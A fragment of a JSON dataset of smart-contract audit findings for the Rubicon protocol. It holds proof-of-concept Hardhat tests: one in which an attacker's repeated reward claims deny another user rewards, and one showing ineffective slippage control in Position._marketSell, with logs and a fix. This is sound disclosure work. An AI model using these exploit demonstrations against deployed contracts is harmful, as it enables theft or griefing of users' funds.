parseUnits(\"0.3\"); //  TODO: WHAT SHOULD THIS BE?\n    const multiplierPerYear = parseUnits(\"0.02\"); //  TODO: WHAT SHOULD THIS BE?\n    const irModel = await interestRateModelFactory.deploy(\n      baseRatePerYear,\n      multiplierPerYear\n    );\n\n    const cTokenFactory = await ethers.getContractFactory(\"CErc20Delegate\");\n    const cTokenImplementation = await cTokenFactory.deploy();\n\n    // Initialize the market\n    const underlying = testCoin.address;\n    const interestRateModel = irModel.address;\n    const initialExchangeRateMantissa = \"200000000000000000000000000\"; // TODO: What should this be?\n\n    const becomeImplementationData = \"0x\"; //TODO: What should this be?\n\n    await bathHouse.createBathToken(\n      underlying,\n      interestRateModel,\n      initialExchangeRateMantissa,\n      cTokenImplementation.address,\n      becomeImplementationData\n    );\n    const bathTokenAddress = await bathHouse.getBathTokenFromAsset(underlying);\n    const bathTEST = new ethers.Contract(bathTokenAddress, CERC20_ABI, owner);\n\n    const buddyAddress = await bathHouse.whoIsBuddy(bathTokenAddress);\n    const buddy = new ethers.Contract(buddyAddress, BUDDY_ABI, owner);\n\n    // Setup cToken in System correctly:\n    await comptroller._supportMarket(bathTEST!.address).catch((e: any) => {\n      console.log(\"\\nError supporting new cToken market!\", e.reason, \"\\n\");\n    });\n\n    await testCoin.connect(alice).faucet();\n    await testStableCoin.connect(alice).faucet();\n    await testCoin.connect(eve).faucet();\n    await testStableCoin.connect(eve).faucet();\n\n    await buddy.setRewardsDuration(\n      365 * 24 * 60 * 60,\n      testStableCoin.address\n    );\n    await testStableCoin.transfer(buddy.address, parseUnits(\"10000\", 6));\n    await buddy.notifyRewardAmount(\n      parseUnits(\"10000\", 6),\n      testStableCoin.address\n    );\n\n    await comptroller.setCompAddress(testRewardCoin.address);\n    await comptroller._setCompSpeeds(\n      [bathTEST.address],\n      [parseUnits(\"2.28\")],\n      [parseUnits(\"0.322\")]\n    );\n\n    const PriceOracleFactory = await ethers.getContractFactory(\n      \"DummyPriceOracle\"\n    );\n    const priceOracle = await PriceOracleFactory.deploy();\n\n    // price of TEST = $0.9\n    await priceOracle.addCtoken(bathTEST.address, parseUnits(\"0.9\", 18));\n\n    await comptroller._setPriceOracle(priceOracle.address);\n\n    await comptroller._setCollateralFactor(bathTEST.address, parseUnits(\"0.7\"));\n\n    const rewardBalance = await testRewardCoin.balanceOf(owner.address);\n    await testRewardCoin.transfer(comptroller.address, rewardBalance);\n\n    await testCoin.connect(alice).approve(bathTEST.address, parseUnits(\"10\"));\n    await bathTEST.connect(alice).mint(parseUnits(\"10\"));\n    await testCoin.connect(eve).approve(bathTEST.address, parseUnits(\"10000\"));\n    await bathTEST.connect(eve).mint(parseUnits(\"10000\"));\n\n    return {\n      comptroller,\n      testCoin,\n      bathTEST,\n      alice,\n      eve,\n      testStableCoin,\n      testRewardCoin,\n      buddy,\n      bathHouse,\n    };\n  }\n\n  describe(\"Testing the rewards\", async function () {\n    it(\"POC1\", async function () {\n      const {\n        alice,\n        eve,\n        testStableCoin,\n        buddy,\n        bathHouse,\n      } = await loadFixture(buddySetupFixture);\n\n      // Eve calls claimRewards to reset lastUpdateTime (claimRewards internaly calls BathBuddy's getReward)\n      await bathHouse.connect(eve).claimRewards([buddy.address], [testStableCoin.address])\n      // Alice tries to claim her rewards\n      await bathHouse.connect(alice).claimRewards([buddy.address], [testStableCoin.address])\n      const earned1 = await testStableCoin.balanceOf(alice.address);\n\n      // Eve calls claimRewards to reset lastUpdateTime\n      await bathHouse.connect(eve).claimRewards([buddy.address], [testStableCoin.address])\n      // Alice tries to claim her rewards\n      await bathHouse.connect(alice).claimRewards([buddy.address], [testStableCoin.address])\n      const earned2 = await testStableCoin.balanceOf(alice.address);\n      // Check that Alice didn't get any rewards\n      expect(earned2.toBigInt() - earned1.toBigInt()).to.be.equal(0);\n\n      // Eve calls claimRewards to reset lastUpdateTime\n      await bathHouse.connect(eve).claimRewards([buddy.address], [testStableCoin.address])\n      // Alice tries to claim her rewards\n      await bathHouse.connect(alice).claimRewards([buddy.address], [testStableCoin.address])\n      const earned3 = await testStableCoin.balanceOf(alice.address);\n      // Check that Alice didn't get any rewards\n      expect(earned3.toBigInt() - earned2.toBigInt()).to.be.equal(0);\n\n      // Eve calls claimRewards to reset lastUpdateTime\n      await bathHouse.connect(eve).claimRewards([buddy.address], [testStableCoin.address])\n      await bathHouse.connect(alice).claimRewards([buddy.address], [testStableCoin.address])\n      const earned4 = await testStableCoin.balanceOf(alice.address);\n      // Check that Alice didn't get any rewards\n      expect(earned4.toBigInt() - earned4.toBigInt()).to.be.equal(0);\n    });\n  });\n});\n```\n\n## Tools Used\nManual Review\n",
      "metadata": {
        "Severity": "High",
        "Difficulty": null,
        "Type": "bug",
        "Finding ID": null,
        "Target": null
      }
    },
    {
      "index": 899,
      "page_start": null,
      "heading": "899. Calling `Position._marketSell` function compares `fill_amt` that includes fee to `min_fill_amount` that does not include fee",
      "heading_cleaned": "Calling `Position._marketSell` function compares `fill_amt` that includes fee to `min_fill_amount` that does not include fee",
      "markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L475-L511\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L1028-L1067\n\n\n# Vulnerability details\n\n## Impact\nCalling the following `Position._marketSell` function calls `rubiconMarket.sellAllAmount(ERC20(_asset), _payAmount, ERC20(_quote), _minFill)`, where `_minFill` does not include `_fee`.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L475-L511\n```solidity\n    function _marketSell(\n        address _asset,\n        address _quote,\n        uint256 _minFill\n    ) internal {\n        uint256 _feeBPS = rubiconMarket.getFeeBPS();\n        uint256 _fee = _minFill.mul(_feeBPS).div(10000);\n        uint256 _payAmount = rubiconMarket.getPayAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _minFill.add(_fee)\n        );\n        uint256 _assetBalance = IERC20(_asset).balanceOf(address(this));\n\n        /// @dev recalculate fee in _asset form\n        _fee = _payAmount.mul(_feeBPS).div(10000);\n\n        if (_assetBalance < _payAmount) {\n            IERC20(_asset).transferFrom(\n                msg.sender,\n                address(this),\n                _payAmount.sub(_assetBalance).add(_fee)\n            );\n        }\n\n        IERC20(_asset).approve(\n            address(rubiconMarket),\n            IERC20(_asset).balanceOf(address(this))\n        );\n\n        rubiconMarket.sellAllAmount(\n            ERC20(_asset),\n            _payAmount,\n            ERC20(_quote),\n            _minFill\n        );\n    }\n```\n\nCalling the following `RubiconMarket.sellAllAmount` function then executes `require(fill_amt >= min_fill_amount, \"min_fill_amount isn't filled\")`. In contrast to `min_fill_amount`, which is the `Position._marketSell` function's `_minFill` that does not include `_fee`, `fill_amt` used in this `require` statement includes the fee. This means that `fill_amt` is very likely to be bigger than `min_fill_amount`, which makes this `require` statement and the corresponding slippage control not effective. In fact, as shown by the POC below, the `fill_amt` with the fee deducted that is set by calling `calcAmountAfterFee(fill_amt)` can equal `min_fill_amount`, which also proves that the `fill_amt`, which includes the fee, would be larger than `min_fill_amount` that does not include fee, and improperly comparing these two in the `require` statement would only result in an ineffective slippage control.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L1028-L1067\n```solidity\n    function sellAllAmount(\n        ERC20 pay_gem,\n        uint256 pay_amt,\n        ERC20 buy_gem,\n        uint256 min_fill_amount\n    ) external returns (uint256 fill_amt) {\n        require(!locked);\n\n        uint256 offerId;\n        while (pay_amt > 0) {\n            //while there is amount to sell\n            offerId = getBestOffer(buy_gem, pay_gem); //Get the best offer for the token pair\n            require(offerId != 0, \"0 offerId\"); //Fails if there are not more offers\n\n            // There is a chance that pay_amt is smaller than 1 wei of the other token\n            if (\n                mul(pay_amt, 1 ether) <\n                wdiv(offers[offerId].buy_amt, offers[offerId].pay_amt)\n            ) {\n                break; //We consider that all amount is sold\n            }\n            if (pay_amt >= offers[offerId].buy_amt) {\n                //If amount to sell is higher or equal than current offer amount to buy\n                fill_amt = add(fill_amt, offers[offerId].pay_amt); //Add amount bought to acumulator\n                pay_amt = sub(pay_amt, offers[offerId].buy_amt); //Decrease amount to sell\n                take(bytes32(offerId), uint128(offers[offerId].pay_amt)); //We take the whole offer\n            } else {\n                // if lower\n                uint256 baux = rmul(\n                    mul(pay_amt, 10 ** 9),\n                    rdiv(offers[offerId].pay_amt, offers[offerId].buy_amt)\n                ) / 10 ** 9;\n                fill_amt = add(fill_amt, baux); //Add amount bought to acumulator\n                take(bytes32(offerId), uint128(baux)); //We take the portion of the offer that we need\n                pay_amt = 0; //All amount is sold\n            }\n        }\n        require(fill_amt >= min_fill_amount, \"min_fill_amount isn't filled\");\n        fill_amt = calcAmountAfterFee(fill_amt);\n    }\n```\n\n## Proof of Concept\nFirst, please update the `Position._marketSell` function as follows to divide by `100_000` for the POC purpose. This is for fixing the bug mentioned in the report titled \"Calling `Position._marketBuy` and `Position._marketSell` functions that calculate `_fee` by dividing by `10000` can cause incorrect calculations\".\n\n```solidity\n    function _marketSell(\n        address _asset,\n        address _quote,\n        uint256 _minFill\n    ) internal {\n        uint256 _feeBPS = rubiconMarket.getFeeBPS();\n\n        /** @audit divide by 100_000 for POC purpose */\n        // uint256 _fee = _minFill.mul(_feeBPS).div(10000);\n        uint256 _fee = _minFill.mul(_feeBPS).div(100_000);\n        /** */\n\n        uint256 _payAmount = rubiconMarket.getPayAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _minFill.add(_fee)\n        );\n        uint256 _assetBalance = IERC20(_asset).balanceOf(address(this));\n\n        /** @audit divide by 100_000 for POC purpose */\n        /// @dev recalculate fee in _asset form\n        // _fee = _payAmount.mul(_feeBPS).div(10000);\n        _fee = _payAmount.mul(_feeBPS).div(100_000);\n        /** */\n\n        if (_assetBalance < _payAmount) {\n            IERC20(_asset).transferFrom(\n                msg.sender,\n                address(this),\n                _payAmount.sub(_assetBalance).add(_fee)\n            );\n        }\n\n        IERC20(_asset).approve(\n            address(rubiconMarket),\n            IERC20(_asset).balanceOf(address(this))\n        );\n\n        rubiconMarket.sellAllAmount(\n            ERC20(_asset),\n            _payAmount,\n            ERC20(_quote),\n            _minFill\n        );\n    }\n```\n\nSecond, please update the `RubiconMarket.sellAllAmount` function as follows to log `min_fill_amount`, the `fill_amt` that includes fee, and the `fill_amt` with the fee deducted for the POC purpose.\n\n```solidity\n    function sellAllAmount(\n        ERC20 pay_gem,\n        uint256 pay_amt,\n        ERC20 buy_gem,\n        uint256 min_fill_amount\n    ) external returns (uint256 fill_amt) {\n        require(!locked);\n\n        uint256 offerId;\n        while (pay_amt > 0) {\n            //while there is amount to sell\n            offerId = getBestOffer(buy_gem, pay_gem); //Get the best offer for the token pair\n            require(offerId != 0, \"0 offerId\"); //Fails if there are not more offers\n\n            // There is a chance that pay_amt is smaller than 1 wei of the other token\n            if (\n                mul(pay_amt, 1 ether) <\n                wdiv(offers[offerId].buy_amt, offers[offerId].pay_amt)\n            ) {\n                break; //We consider that all amount is sold\n            }\n            if (pay_amt >= offers[offerId].buy_amt) {\n                //If amount to sell is higher or equal than current offer amount to buy\n                fill_amt = add(fill_amt, offers[offerId].pay_amt); //Add amount bought to acumulator\n                pay_amt = sub(pay_amt, offers[offerId].buy_amt); //Decrease amount to sell\n                take(bytes32(offerId), uint128(offers[offerId].pay_amt)); //We take the whole offer\n            } else {\n                // if lower\n                uint256 baux = rmul(\n                    mul(pay_amt, 10 ** 9),\n                    rdiv(offers[offerId].pay_amt, offers[offerId].buy_amt)\n                ) / 10 ** 9;\n                fill_amt = add(fill_amt, baux); //Add amount bought to acumulator\n                take(bytes32(offerId), uint128(baux)); //We take the portion of the offer that we need\n                pay_amt = 0; //All amount is sold\n            }\n        }\n\n        /** @audit console.log min_fill_amount for POC purpose */\n        console.log(\"min_fill_amount:\");\n        console.log(min_fill_amount);\n        console.log(\"\");\n        /** */\n\n        /** @audit console.log fill_amt for POC purpose */\n        console.log(\"fill_amt that includes fee:\");\n        console.log(fill_amt);\n        console.log(\"\");\n\n        console.log(\"Is the fill_amt, which includes fee, bigger than min_fill_amount that does not include fee?\");\n        console.log(fill_amt > min_fill_amount);\n        console.log(\"\");\n        /** */\n\n        require(fill_amt >= min_fill_amount, \"min_fill_amount isn't filled\");\n        fill_amt = calcAmountAfterFee(fill_amt);\n\n        /** @audit console.log fill_amt with fee deducted for POC purpose */\n        console.log(\"fill_amt with fee deducted:\");\n        console.log(fill_amt);\n        console.log(\"\");\n\n        console.log(\"Does the fill_amt with fee deducted equal min_fill_amount that does not include fee?\");\n        console.log(fill_amt == min_fill_amount);\n        console.log(\"\");\n        /** */\n    }\n```\n\nThird, please add the following `Calling Position._marketSell function compares fill_amt that includes fee to min_fill_amount that does not include fee` test in the `Long positions` `describe` block in `test\\hardhat-tests\\leverage-wrapper.ts`. This test will pass to print the logs below for demonstrating the described scenario.\n\n```typescript\n      it.only(\"Calling Position._marketSell function compares fill_amt that includes fee to min_fill_amount that does not include fee\", async function () {\n        const { owner, testCoin, testStableCoin, Position, rubiconMarket } =\n          await loadFixture(deployPoolsUtilityFixture);\n\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT,\n          x1_25\n        );\n\n        await rubiconMarket.functions[\"offer(uint256,address,uint256,address)\"](\n          parseUnits(\"1300\", 6),\n          testStableCoin.address,\n          parseUnits(\"1000\"),\n          testCoin.address,\n          { from: owner.address }\n        );\n\n        // Call Position.closePosition function, which further calls Position._marketSell function.\n        // console.logs in RubiconMarket.sellAllAmount function show that\n        //   the fill_amt, which includes fee, is bigger than min_fill_amount that does not include fee and\n        //   the fill_amt with fee deducted equals min_fill_amount input that does not include fee.\n        await Position.connect(owner).closePosition(1);\n      });\n```\n\n```solidity\nmin_fill_amount:\n5625001\n\nfill_amt that includes fee:\n5625057\n\nIs the fill_amt, which includes fee, bigger than min_fill_amount that does not include fee?\ntrue\n\nfill_amt with fee deducted:\n5625001\n\nDoes the fill_amt with fee deducted equal min_fill_amount that does not include fee?\ntrue\n```\n\n## Tools Used\nVSCode\n\n## Recommended Mitigation Steps\nThe `Position._marketSell` function can be updated to call `rubiconMarket.sellAllAmount(ERC20(_asset), _payAmount, ERC20(_quote), _minFill.add(_fee))` instead of `rubiconMarket.sellAllAmount(ERC20(_asset), _payAmount, ERC20(_quote), _minFill)`.\n",
      "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L475-L511\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L1028-L1067\n\n\n# Vulnerability details\n\n## Impact\nCalling the following `Position._marketSell` function calls `rubiconMarket.sellAllAmount(ERC20(_asset), _payAmount, ERC20(_quote), _minFill)`, where `_minFill` does not include `_fee`.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L475-L511\n```solidity\n    function _marketSell(\n        address _asset,\n        address _quote,\n        uint256 _minFill\n    ) internal {\n        uint256 _feeBPS = rubiconMarket.getFeeBPS();\n        uint256 _fee = _minFill.mul(_feeBPS).div(10000);\n        uint256 _payAmount = rubiconMarket.getPayAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _minFill.add(_fee)\n        );\n        uint256 _assetBalance = IERC20(_asset).balanceOf(address(this));\n\n        /// @dev recalculate fee in _asset form\n        _fee = _payAmount.mul(_feeBPS).div(10000);\n\n        if (_assetBalance < _payAmount) {\n            IERC20(_asset).transferFrom(\n                msg.sender,\n                address(this),\n                _payAmount.sub(_assetBalance).add(_fee)\n            );\n        }\n\n        IERC20(_asset).approve(\n            address(rubiconMarket),\n            IERC20(_asset).balanceOf(address(this))\n        );\n\n        rubiconMarket.sellAllAmount(\n            ERC20(_asset),\n            _payAmount,\n            ERC20(_quote),\n            _minFill\n        );\n    }\n```\n\nCalling the following `RubiconMarket.sellAllAmount` function then executes `require(fill_amt >= min_fill_amount, \"min_fill_amount isn't filled\")`. In contrast to `min_fill_amount`, which is the `Position._marketSell` function's `_minFill` that does not include `_fee`, `fill_amt` used in this `require` statement includes the fee. This means that `fill_amt` is very likely to be bigger than `min_fill_amount`, which makes this `require` statement and the corresponding slippage control not effective. In fact, as shown by the POC below, the `fill_amt` with the fee deducted that is set by calling `calcAmountAfterFee(fill_amt)` can equal `min_fill_amount`, which also proves that the `fill_amt`, which includes the fee, would be larger than `min_fill_amount` that does not include fee, and improperly comparing these two in the `require` statement would only result in an ineffective slippage control.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L1028-L1067\n```solidity\n    function sellAllAmount(\n        ERC20 pay_gem,\n        uint256 pay_amt,\n        ERC20 buy_gem,\n        uint256 min_fill_amount\n    ) external returns (uint256 fill_amt) {\n        require(!locked);\n\n        uint256 offerId;\n        while (pay_amt > 0) {\n            //while there is amount to sell\n            offerId = getBestOffer(buy_gem, pay_gem); //Get the best offer for the token pair\n            require(offerId != 0, \"0 offerId\"); //Fails if there are not more offers\n\n            // There is a chance that pay_amt is smaller than 1 wei of the other token\n            if (\n                mul(pay_amt, 1 ether) <\n                wdiv(offers[offerId].buy_amt, offers[offerId].pay_amt)\n            ) {\n                break; //We consider that all amount is sold\n            }\n            if (pay_amt >= offers[offerId].buy_amt) {\n                //If amount to sell is higher or equal than current offer amount to buy\n                fill_amt = add(fill_amt, offers[offerId].pay_amt); //Add amount bought to acumulator\n                pay_amt = sub(pay_amt, offers[offerId].buy_amt); //Decrease amount to sell\n                take(bytes32(offerId), uint128(offers[offerId].pay_amt)); //We take the whole offer\n            } else {\n                // if lower\n                uint256 baux = rmul(\n                    mul(pay_amt, 10 ** 9),\n                    rdiv(offers[offerId].pay_amt, offers[offerId].buy_amt)\n                ) / 10 ** 9;\n                fill_amt = add(fill_amt, baux); //Add amount bought to acumulator\n                take(bytes32(offerId), uint128(baux)); //We take the portion of the offer that we need\n                pay_amt = 0; //All amount is sold\n            }\n        }\n        require(fill_amt >= min_fill_amount, \"min_fill_amount isn't filled\");\n        fill_amt = calcAmountAfterFee(fill_amt);\n    }\n```\n\n## Proof of Concept\nFirst, please update the `Position._marketSell` function as follows to divide by `100_000` for the POC purpose. This is for fixing the bug mentioned in the report titled \"Calling `Position._marketBuy` and `Position._marketSell` functions that calculate `_fee` by dividing by `10000` can cause incorrect calculations\".\n\n```solidity\n    function _marketSell(\n        address _asset,\n        address _quote,\n        uint256 _minFill\n    ) internal {\n        uint256 _feeBPS = rubiconMarket.getFeeBPS();\n\n        /** @audit divide by 100_000 for POC purpose */\n        // uint256 _fee = _minFill.mul(_feeBPS).div(10000);\n        uint256 _fee = _minFill.mul(_feeBPS).div(100_000);\n        /** */\n\n        uint256 _payAmount = rubiconMarket.getPayAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _minFill.add(_fee)\n        );\n        uint256 _assetBalance = IERC20(_asset).balanceOf(address(this));\n\n        /** @audit divide by 100_000 for POC purpose */\n        /// @dev recalculate fee in _asset form\n        // _fee = _payAmount.mul(_feeBPS).div(10000);\n        _fee = _payAmount.mul(_feeBPS).div(100_000);\n        /** */\n\n        if (_assetBalance < _payAmount) {\n            IERC20(_asset).transferFrom(\n                msg.sender,\n                address(this),\n                _payAmount.sub(_assetBalance).add(_fee)\n            );\n        }\n\n        IERC20(_asset).approve(\n            address(rubiconMarket),\n            IERC20(_asset).balanceOf(address(this))\n        );\n\n        rubiconMarket.sellAllAmount(\n            ERC20(_asset),\n            _payAmount,\n            ERC20(_quote),\n            _minFill\n        );\n    }\n```\n\nSecond, please update the `RubiconMarket.sellAllAmount` function as follows to log `min_fill_amount`, the `fill_amt` that includes fee, and the `fill_amt` with the fee deducted for the POC purpose. \n\n```solidity\n    function sellAllAmount(\n        ERC20 pay_gem,\n        uint256 pay_amt,\n        ERC20 buy_gem,\n        uint256 min_fill_amount\n    ) external returns (uint256 fill_amt) {\n        require(!locked);\n\n        uint256 offerId;\n        while (pay_amt > 0) {\n            //while there is amount to sell\n            offerId = getBestOffer(buy_gem, pay_gem); //Get the best offer for the token pair\n            require(offerId != 0, \"0 offerId\"); //Fails if there are not more offers\n\n            // There is a chance that pay_amt is smaller than 1 wei of the other token\n            if (\n                mul(pay_amt, 1 ether) <\n                wdiv(offers[offerId].buy_amt, offers[offerId].pay_amt)\n            ) {\n                break; //We consider that all amount is sold\n            }\n            if (pay_amt >= offers[offerId].buy_amt) {\n                //If amount to sell is higher or equal than current offer amount to buy\n                fill_amt = add(fill_amt, offers[offerId].pay_amt); //Add amount bought to acumulator\n                pay_amt = sub(pay_amt, offers[offerId].buy_amt); //Decrease amount to sell\n                take(bytes32(offerId), uint128(offers[offerId].pay_amt)); //We take the whole offer\n            } else {\n                // if lower\n                uint256 baux = rmul(\n                    mul(pay_amt, 10 ** 9),\n                    rdiv(offers[offerId].pay_amt, offers[offerId].buy_amt)\n                ) / 10 ** 9;\n                fill_amt = add(fill_amt, baux); //Add amount bought to acumulator\n                take(bytes32(offerId), uint128(baux)); //We take the portion of the offer that we need\n                pay_amt = 0; //All amount is sold\n            }\n        }\n\n        /** @audit console.log min_fill_amount for POC purpose */\n        console.log(\"min_fill_amount:\");\n        console.log(min_fill_amount);\n        console.log(\"\");\n        /** */\n\n        /** @audit console.log fill_amt for POC purpose */\n        console.log(\"fill_amt that includes fee:\");\n        console.log(fill_amt);\n        console.log(\"\");\n\n        console.log(\"Is the fill_amt, which includes fee, bigger than min_fill_amount that does not include fee?\");\n        console.log(fill_amt > min_fill_amount);\n        console.log(\"\");\n        /** */\n\n        require(fill_amt >= min_fill_amount, \"min_fill_amount isn't filled\");\n        fill_amt = calcAmountAfterFee(fill_amt);\n\n        /** @audit console.log fill_amt with fee deducted for POC purpose */\n        console.log(\"fill_amt with fee deducted:\");\n        console.log(fill_amt);\n        console.log(\"\");\n\n        console.log(\"Does the fill_amt with fee deducted equal min_fill_amount that does not include fee?\");\n        console.log(fill_amt == min_fill_amount);\n        console.log(\"\");\n        /** */\n    }\n```\n\nThird, please add the following `Calling Position._marketSell function compares fill_amt that includes fee to min_fill_amount that does not include fee` test in the `Long positions` `describe` block in `test\\hardhat-tests\\leverage-wrapper.ts`. This test will pass to print the logs below for demonstrating the described scenario.\n\n```typescript\n      it.only(\"Calling Position._marketSell function compares fill_amt that includes fee to min_fill_amount that does not include fee\", async function () {\n        const { owner, testCoin, testStableCoin, Position, rubiconMarket } =\n          await loadFixture(deployPoolsUtilityFixture);\n\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT,\n          x1_25\n        );\n\n        await rubiconMarket.functions[\"offer(uint256,address,uint256,address)\"](\n          parseUnits(\"1300\", 6),\n          testStableCoin.address,\n          parseUnits(\"1000\"),\n          testCoin.address,\n          { from: owner.address }\n        );\n\n        // Call Position.closePosition function, which further calls Position._marketSell function.\n        // console.logs in RubiconMarket.sellAllAmount function show that\n        //   the fill_amt, which includes fee, is bigger than min_fill_amount that does not include fee and\n        //   the fill_amt with fee deducted equals min_fill_amount input that does not include fee.\n        await Position.connect(owner).closePosition(1);\n      });\n```\n\n```solidity\nmin_fill_amount:\n5625001\n\nfill_amt that includes fee:\n5625057\n\nIs the fill_amt, which includes fee, bigger than min_fill_amount that does not include fee?\ntrue\n\nfill_amt with fee deducted:\n5625001\n\nDoes the fill_amt with fee deducted equal min_fill_amount that does not include fee?\ntrue\n```\n\n## Tools Used\nVSCode\n\n## Recommended Mitigation Steps\nThe `Position._marketSell` function can be updated to call `rubiconMarket.sellAllAmount(ERC20(_asset), _payAmount, ERC20(_quote), _minFill.add(_fee))` instead of `rubiconMarket.sellAllAmount(ERC20(_asset), _payAmount, ERC20(_quote), _minFill)`.",
      "description": null,
      "impact": "## Impact\nCalling the following `Position._marketSell` function calls `rubiconMarket.sellAllAmount(ERC20(_asset), _payAmount, ERC20(_quote), _minFill)`, where `_minFill` does not include `_fee`.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L475-L511\n```solidity\n    function _marketSell(\n        address _asset,\n        address _quote,\n        uint256 _minFill\n    ) internal {\n        uint256 _feeBPS = rubiconMarket.getFeeBPS();\n        uint256 _fee = _minFill.mul(_feeBPS).div(10000);\n        uint256 _payAmount = rubiconMarket.getPayAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _minFill.add(_fee)\n        );\n        uint256 _assetBalance = IERC20(_asset).balanceOf(address(this));\n\n        /// @dev recalculate fee in _asset form\n        _fee = _payAmount.mul(_feeBPS).div(10000);\n\n        if (_assetBalance < _payAmount) {\n            IERC20(_asset).transferFrom(\n                msg.sender,\n                address(this),\n                _payAmount.sub(_assetBalance).add(_fee)\n            );\n        }\n\n        IERC20(_asset).approve(\n            address(rubiconMarket),\n            IERC20(_asset).balanceOf(address(this))\n        );\n\n        rubiconMarket.sellAllAmount(\n            ERC20(_asset),\n            _payAmount,\n            ERC20(_quote),\n            _minFill\n        );\n    }\n```\n\nCalling the following `RubiconMarket.sellAllAmount` function then executes `require(fill_amt >= min_fill_amount, \"min_fill_amount isn't filled\")`. In contrast to `min_fill_amount`, which is the `Position._marketSell` function's `_minFill` that does not include `_fee`, `fill_amt` used in this `require` statement includes the fee. This means that `fill_amt` is very likely to be bigger than `min_fill_amount`, which makes this `require` statement and the corresponding slippage control not effective. In fact, as shown by the POC below, the `fill_amt` with the fee deducted that is set by calling `calcAmountAfterFee(fill_amt)` can equal `min_fill_amount`, which also proves that the `fill_amt`, which includes the fee, would be larger than `min_fill_amount` that does not include fee, and improperly comparing these two in the `require` statement would only result in an ineffective slippage control.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L1028-L1067\n```solidity\n    function sellAllAmount(\n        ERC20 pay_gem,\n        uint256 pay_amt,\n        ERC20 buy_gem,\n        uint256 min_fill_amount\n    ) external returns (uint256 fill_amt) {\n        require(!locked);\n\n        uint256 offerId;\n        while (pay_amt > 0) {\n            //while there is amount to sell\n            offerId = getBestOffer(buy_gem, pay_gem); //Get the best offer for the token pair\n            require(offerId != 0, \"0 offerId\"); //Fails if there are not more offers\n\n            // There is a chance that pay_amt is smaller than 1 wei of the other token\n            if (\n                mul(pay_amt, 1 ether) <\n                wdiv(offers[offerId].buy_amt, offers[offerId].pay_amt)\n            ) {\n                break; //We consider that all amount is sold\n            }\n            if (pay_amt >= offers[offerId].buy_amt) {\n                //If amount to sell is higher or equal than current offer amount to buy\n                fill_amt = add(fill_amt, offers[offerId].pay_amt); //Add amount bought to acumulator\n                pay_amt = sub(pay_amt, offers[offerId].buy_amt); //Decrease amount to sell\n                take(bytes32(offerId), uint128(offers[offerId].pay_amt)); //We take the whole offer\n            } else {\n                // if lower\n                uint256 baux = rmul(\n                    mul(pay_amt, 10 ** 9),\n                    rdiv(offers[offerId].pay_amt, offers[offerId].buy_amt)\n                ) / 10 ** 9;\n                fill_amt = add(fill_amt, baux); //Add amount bought to acumulator\n                take(bytes32(offerId), uint128(baux)); //We take the portion of the offer that we need\n                pay_amt = 0; //All amount is sold\n            }\n        }\n        require(fill_amt >= min_fill_amount, \"min_fill_amount isn't filled\");\n        fill_amt = calcAmountAfterFee(fill_amt);\n    }\n```\n",
      "mitigation": "## Recommended Mitigation Steps\nThe `Position._marketSell` function can be updated to call `rubiconMarket.sellAllAmount(ERC20(_asset), _payAmount, ERC20(_quote), _minFill.add(_fee))` instead of `rubiconMarket.sellAllAmount(ERC20(_asset), _payAmount, ERC20(_quote), _minFill)`.\n",
      "poc": "## Proof of Concept\nFirst, please update the `Position._marketSell` function as follows to divide by `100_000` for the POC purpose. This is for fixing the bug mentioned in the report titled \"Calling `Position._marketBuy` and `Position._marketSell` functions that calculate `_fee` by dividing by `10000` can cause incorrect calculations\".\n\n```solidity\n    function _marketSell(\n        address _asset,\n        address _quote,\n        uint256 _minFill\n    ) internal {\n        uint256 _feeBPS = rubiconMarket.getFeeBPS();\n\n        /** @audit divide by 100_000 for POC purpose */\n        // uint256 _fee = _minFill.mul(_feeBPS).div(10000);\n        uint256 _fee = _minFill.mul(_feeBPS).div(100_000);\n        /** */\n\n        uint256 _payAmount = rubiconMarket.getPayAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _minFill.add(_fee)\n        );\n        uint256 _assetBalance = IERC20(_asset).balanceOf(address(this));\n\n        /** @audit divide by 100_000 for POC purpose */\n        /// @dev recalculate fee in _asset form\n        // _fee = _payAmount.mul(_feeBPS).div(10000);\n        _fee = _payAmount.mul(_feeBPS).div(100_000);\n        /** */\n\n        if (_assetBalance < _payAmount) {\n            IERC20(_asset).transferFrom(\n                msg.sender,\n                address(this),\n                _payAmount.sub(_assetBalance).add(_fee)\n            );\n        }\n\n        IERC20(_asset).approve(\n            address(rubiconMarket),\n            IERC20(_asset).balanceOf(address(this))\n        );\n\n        rubiconMarket.sellAllAmount(\n            ERC20(_asset),\n            _payAmount,\n            ERC20(_quote),\n            _minFill\n        );\n    }\n```\n\nSecond, please update the `RubiconMarket.sellAllAmount` function as follows to log `min_fill_amount`, the `fill_amt` that includes fee, and the `fill_amt` with the fee deducted for the POC purpose.\n\n```solidity\n    function sellAllAmount(\n        ERC20 pay_gem,\n        uint256 pay_amt,\n        ERC20 buy_gem,\n        uint256 min_fill_amount\n    ) external returns (uint256 fill_amt) {\n        require(!locked);\n\n        uint256 offerId;\n        while (pay_amt > 0) {\n            //while there is amount to sell\n            offerId = getBestOffer(buy_gem, pay_gem); //Get the best offer for the token pair\n            require(offerId 